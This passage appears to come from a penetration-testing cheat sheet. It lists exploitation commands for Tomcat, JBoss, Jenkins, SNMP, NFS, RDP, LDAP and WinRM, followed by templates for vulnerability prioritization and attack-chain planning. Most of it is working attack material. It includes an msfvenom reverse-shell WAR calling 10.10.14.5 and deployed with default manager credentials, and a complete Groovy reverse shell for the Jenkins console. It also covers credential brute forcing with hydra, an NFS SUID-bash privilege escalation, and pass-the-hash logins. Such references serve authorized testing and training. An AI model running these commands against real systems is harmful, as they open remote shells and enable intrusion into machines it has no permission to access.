msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war > shell.war
```
```bash
# Deploy WAR shell via manager
curl -u tomcat:tomcat --upload-file shell.war "https://<IP>:8080/manager/text/deploy?path=/shell"
```
```bash
# Access deployed shell
curl https://<IP>:8080/shell/
```
```bash
# Manual WAR deployment via manager
# 1. Navigate to /manager/html
# 2. Login with credentials
# 3. Upload WAR file in "WAR file to deploy" section
# 4. Access at /shell_name/
```
```bash
# CVE checks for Tomcat
searchsploit tomcat
```
```bash
# Check for PUT method RCE
nmap --script http-vuln-cve2017-12615 <IP> -p 8080
```

#### JBoss/WildFly (Port 8080, 9990)

```bash
# Common paths
/
https://<IP>:8080/admin-console
https://<IP>:8080/jmx-console
https://<IP>:8080/invoker/JMXInvokerServlet
https://<IP>:8080/web-console
https://<IP>:9990/console
```
```bash
# Check for unauthenticated JMX console
https://<IP>:8080/jmx-console/
```
```bash
# Default credentials
# admin:admin
# admin:password
```
```bash
# JBoss exploitation tools
jexboss -u https://<IP>:8080
```

#### Jenkins (Port 8080)

```bash
# Common paths
https://<IP>:8080/
https://<IP>:8080/script  # Groovy script console
https://<IP>:8080/manage
https://<IP>:8080/asynchPeople/
https://<IP>:8080/systemInfo
```
```bash
# Default credentials
# admin:admin
# admin:password
```
```groovy
# Groovy reverse shell (if script console accessible)
String host="<RHOST>";
int port=<RPORT>;
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}};p.destroy();s.close();
```
```groovy
# Windows Groovy reverse shell
def cmd = "cmd.exe /c powershell -e BASE64_ENCODED_PAYLOAD"
cmd.execute()
```

### 5.7 Network Services

#### SNMP (Port 161/UDP)

```bash
# Enumerate with default community strings (v1)
snmpwalk -v1 -c public <IP>
```
```bash
# Enumerate with default community strings (v2c) #1
snmpwalk -v2c -c public <IP>
```
```bash
# Enumerate with default community strings (v2c) #2
snmpwalk -v2c -c private <IP>
```
```bash
# Full enumeration
snmpwalk -v2c -c public <IP> .1
```
```bash
# Enumerate extended objects
snmpwalk -v2c -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendObjects
```
```bash
# Enumerate system processes
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.1.6.0
```
```bash
# Enumerate running processes
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.2
```
```bash
# Enumerate user accounts
snmpwalk -v2c -c public <IP> 1.3.6.1.4.1.77.1.2.25
```
```bash
# Brute force community strings with onesixtyone
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt <IP>
```
```bash
# Brute force community strings with hydra
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <IP> snmp
```
```bash
# Nmap scripts
nmap -sU --script snmp-info,snmp-brute,snmp-interfaces,snmp-processes,snmp-sysdescr <IP> -p 161
```

#### NFS (Port 2049)

```bash
# Show exported shares
showmount -e <IP>
```
```bash
# Show all mount points
showmount -a <IP>
```
```bash
# Mount NFS share
mkdir /tmp/nfs
mount -t nfs <IP>:/share /tmp/nfs
```
```bash
# Mount with specific version
mount -t nfs -o vers=3 <IP>:/share /tmp/nfs
```
```bash
# Nmap scripts
nmap --script nfs-ls,nfs-showmount,nfs-statfs <IP> -p 2049
```
```bash
# Check for no_root_squash (allows root access)
cat /etc/exports  # On target if accessible
```
```bash
# Exploit no_root_squash
# 1. Mount share
# 2. Create SUID binary as root
cp /bin/bash /tmp/nfs/bash
chmod +s /tmp/nfs/bash
# 3. On target: /share/bash -p
```

#### RDP (Port 3389)

```bash
# Nmap scripts
nmap --script rdp-enum-encryption,rdp-vuln-ms12-020 <IP> -p 3389
```
```bash
# Connect with rdesktop
rdesktop <IP>
```
```bash
# Connect with rdesktop and credentials
rdesktop -u admin -p password <IP>
```
```bash
# Connect with xfreerdp
xfreerdp /u:admin /p:password /v:<IP>
```
```bash
# Connect with xfreerdp ignoring certificate
xfreerdp /u:admin /p:password /v:<IP> /cert:ignore
```
```bash
# Brute force with hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt rdp://<IP> -t 4
```
```bash
# Brute force with netexec
netexec rdp <IP> -u admin -p passwords.txt
```
```bash
# Check BlueKeep vulnerability (CVE-2019-0708)
nmap --script rdp-vuln-ms12-020 <IP> -p 3389
```

#### LDAP (Port 389, 636)

```bash
# Anonymous bind enumeration
ldapsearch -x -H ldap://<IP> -b "dc=example,dc=com"
```
```bash
# Get naming contexts
ldapsearch -x -H ldap://<IP> -s base namingcontexts
```
```bash
# Enumerate users
ldapsearch -x -H ldap://<IP> -b "dc=example,dc=com" "(objectClass=user)"
```
```bash
# Enumerate users by sAMAccountName
ldapsearch -x -H ldap://<IP> -b "dc=example,dc=com" "(&(objectClass=user)(sAMAccountName=*))"
```
```bash
# With credentials
ldapsearch -x -H ldap://<IP> -D "cn=admin,dc=example,dc=com" -w password -b "dc=example,dc=com"
```
```bash
# Nmap scripts
nmap --script ldap-rootdse,ldap-search <IP> -p 389
```

#### WinRM (Port 5985, 5986)

```bash
# Evil-WinRM connection with password
evil-winrm -i <IP> -u admin -p password
```
```bash
# Evil-WinRM connection with hash
evil-winrm -i <IP> -u admin -H NTLM_HASH
```
```bash
# NetExec authentication test
netexec winrm <IP> -u admin -p password
```
```bash
# NetExec command execution
netexec winrm <IP> -u admin -p password -x "whoami"
```
```bash
# Test authentication
Test-WSMan -ComputerName <IP>
```

---

## 6 Building the Exploitation Plan

### 6.1 Vulnerability Prioritization Matrix

| Priority | Criteria | Examples |
|----------|----------|----------|
| **P1 - Critical** | Direct RCE, Unauthenticated access | EternalBlue, Log4Shell, Unauthenticated file upload |
| **P2 - High** | Auth bypass, Privilege escalation, SQLi with data access | Authentication bypass, UNION SQLi, SSTI |
| **P3 - Medium** | Requires interaction, Limited impact | Stored XSS, CSRF, Information disclosure |
| **P4 - Low** | Theoretical, Difficult to exploit | Reflected XSS (no cookies), Missing headers |

### 6.2 Vulnerability Documentation Template

```markdown
## Vulnerability: [Name]

**Host/URL:** [Target]
**Service/Port:** [Service details]
**Severity:** [Critical/High/Medium/Low]

### Description
[What the vulnerability is and why it matters]

### Evidence
[Screenshots, responses, error messages]

### Reproduction Steps
1. [Step-by-step instructions]
2. [Include exact commands/payloads]
3. [Expected vs actual results]

### Impact
[What an attacker could achieve]

### References
- [CVE numbers]
- [PayloadsAllTheThings links]
- [Exploit-DB links]

### Exploitation Notes
[Payload used, modifications needed, gotchas]
```

### 6.3 Attack Chain Planning

```markdown
## Primary Attack Path
1. [Initial access vector] ‚Üí [foothold method]
2. [Privilege escalation opportunity]
3. [Persistence/lateral movement if applicable]

## Backup Attack Paths
- Path B: [Alternative if primary fails]
- Path C: [Third option]

## Required Tools/Payloads
- [ ] Reverse shell payload for [OS/language]
- [ ] Exploit script for [CVE]
- [ ] Wordlist for [service]

## Pre-Exploitation Setup
- [ ] Listener ready on port [X]
- [ ] Web server for payload delivery
- [ ] Exploit dependencies installed
```



